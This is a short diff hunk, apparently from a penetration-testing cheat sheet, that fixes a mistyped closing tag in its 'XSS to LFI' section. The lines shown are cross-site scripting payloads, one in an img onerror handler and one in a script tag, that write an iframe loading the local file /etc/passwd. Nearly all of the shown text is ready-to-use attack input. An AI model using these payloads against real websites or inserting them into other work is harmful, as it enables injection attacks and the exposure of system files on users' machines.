@@ -294,7 +294,7 @@ https://malwaredecoder.com/
 ### XSS to LFI
 ```
 <img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
 ```
 	
 ### XSS - Session Hijacking
